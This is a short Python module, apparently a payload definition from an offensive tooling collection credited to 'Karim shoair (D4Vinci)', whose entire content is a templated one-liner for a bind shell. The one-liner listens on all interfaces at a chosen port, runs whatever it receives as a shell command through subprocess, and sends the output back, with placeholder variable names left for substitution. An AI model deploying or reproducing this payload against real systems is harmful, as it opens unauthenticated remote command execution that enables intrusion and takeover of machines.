class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use python socket module and subprocess to establish bind shell on specifed port."
    function    = "bind shell"
    liner     = """python -c 'while NUM1: from subprocess import Popen,PIPE;from socket import socket,AF_INET,SOCK_STREAM;VAR1=socket(AF_INET,SOCK_STREAM);VAR1.bind(("0.0.0.0",PORT));VAR2,VAR3=VAR1.recvfrom(8096);VAR4=Popen(VAR2,shell=True,stdout=PIPE,stderr=PIPE).communicate();VAR1.sendto("".join([VAR4[0],VAR4[1]]),VAR3)'"""
